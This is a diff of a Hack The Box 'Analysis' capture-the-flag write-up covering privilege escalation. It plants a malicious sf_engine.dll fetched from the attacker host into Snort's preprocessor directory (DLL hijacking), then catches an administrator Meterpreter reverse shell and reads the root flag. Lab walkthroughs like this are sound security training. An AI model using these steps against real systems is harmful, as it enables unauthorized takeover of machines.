@@ -1,6 +1,6 @@
 ---
 title: HTB - Analysis
-date: 2024-01-23
+date: 2024-01-24
 categories: [CTF, Fullpwn]
 tags: [htb, hackthebox, analysis, ldap, ffuf, dir-busting, subdomain, virtual-host]
 img_path: /assets/htb/fullpwn/analysis/
@@ -569,6 +569,8 @@ Mode                LastWriteTime         Length Name
 8848e4efa24ce8385d44f262ba31cba6
 ```
 
+> Run `winpeas`.
+
 As we noticed earlier, **Snort** is used on this machine.
 
 > How to check snort's version?
@@ -578,6 +580,46 @@ As we noticed earlier, **Snort** is used on this machine.
 > [Snort 2.9.7.0-WIN32 DLL Hijacking](https://packetstormsecurity.com/files/138915/Snort-2.9.7.0-WIN32-DLL-Hijacking.html)
 
 > [DLL Hijacking Practical](https://www.cs.toronto.edu/~arnold/427/16s/csc427_16s/tutorials/DLLHijacking/DLL%20Hijacking%20Practical.pdf)
+
+We can read Snort's configuration:
+
+```bash
+# reading snort's configuration file
+*Evil-WinRM* PS C:\snort\lib\snort_dynamicpreprocessor> type ../../etc/snort.conf
+
+<SNIP>
+
+###################################################
+# This file contains a sample snort configuration.
+# You should take the following steps to create your own custom configuration:
+#
+#  1) Set the network variables.
+#  2) Configure the decoder
+#  3) Configure the base detection engine
+#  4) Configure dynamic loaded libraries
+#  5) Configure preprocessors
+#  6) Configure output plugins
+#  7) Customize your rule set
+#  8) Customize preprocessor and decoder rule set
+#  9) Customize shared object rule set
+###################################################
+
+<SNIP>
+
+###################################################
+# Step #4: Configure dynamic loaded libraries.
+# For more information, see Snort Manual, Configuring Snort - Dynamic Modules
+###################################################
+
+# path to dynamic preprocessor libraries
+dynamicpreprocessor directory C:\Snort\lib\snort_dynamicpreprocessor
+
+# path to base preprocessor engine
+dynamicengine C:\Snort\lib\snort_dynamicengine\sf_engine.dll
+
+# path to dynamic rules libraries
+# dynamicdetection directory C:\Snort\lib\snort_dynamicrules
+```
 
 ```bash
 # creating a malicious DLL
@@ -595,20 +637,7 @@ Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
 
 ```powershell
 # download the malicious DLL
-*Evil-WinRM* PS C:\Users\jdoe\Documents> cd C:\snort\lib\snort_dynamicpreprocessor
-*Evil-WinRM* PS C:\snort\lib\snort_dynamicpreprocessor> wget http://10.10.14.16:8888/sf_engine.dll
-
-StatusCode        : 200
-StatusDescription : OK
-Content           : {77, 90, 144, 0...}
-RawContent        : HTTP/1.0 200 OK
-                    Content-Length: 9216
-                    Content-Type: application/x-msdos-program
-                    Date: Wed, 24 Jan 2024 07:31:59 GMT
-                    Last-Modified: Wed, 24 Jan 2024 07:25:00 GMT
-                    Server: SimpleHTTP/0.6 Python/3.11....
-Headers           : {[Content-Length, 9216], [Content-Type, application/x-msdos-program], [Date, Wed, 24 Jan 2024 07:31:59 GMT], [Last-Modified, Wed, 24 Jan 2024 07:25:00 GMT]...}
-RawContentLength  : 9216
+*Evil-WinRM* PS C:\snort\lib\snort_dynamicpreprocessor> wget http://10.10.14.16:8000/sf_engine.dll -o sf_engine.dll
 
 # confirm the file was downloaded
 *Evil-WinRM* PS C:\snort\lib\snort_dynamicpreprocessor> ls
@@ -620,15 +649,6 @@ Mode                LastWriteTime         Length Name
 <SNIP>
 -a----        1/23/2024  10:13 PM           9216 sf_engine.dll
 <SNIP>
-
-# create an empty .pcap file
-*Evil-WinRM* PS C:\snort\lib\snort_dynamicpreprocessor> New-Item -Path "C:\snort\lib\snort_dynamicpreprocessor\emptyFile.pcap" -ItemType File
-
-    Directory: C:\snort\lib\snort_dynamicpreprocessor
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a----        1/24/2024   8:33 AM              0 emptyFile.pcap
 ```
 
 Finally, we can launch our meterpreter and wait to catch our shell:
@@ -655,9 +675,31 @@ Exploit target:
    --  ----
    0   Wildcard Target
 
+
 View the full module info with the info, or info -d command.
 
 msf6 exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on 10.10.14.16:9999
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.14.16:9999
+[*] Sending stage (200774 bytes) to 10.10.11.250
+[*] Meterpreter session 7 opened (10.10.14.16:9999 -> 10.10.11.250:63692) at 2024-01-24 12:44:05 +0000
+
+meterpreter > getuid
+Server username: ANALYSIS\Administrateur
+meterpreter > shell
+Process 3120 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.5329]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>type c:\users\administrateur\desktop\root.txt
+type c:\users\administrateur\desktop\root.txt
+b8e76f49d5c1cc4a1ffb7e598d9018d4
 ```
+
+
+
+![](machine_pwned.png){: width="75%" .normal}
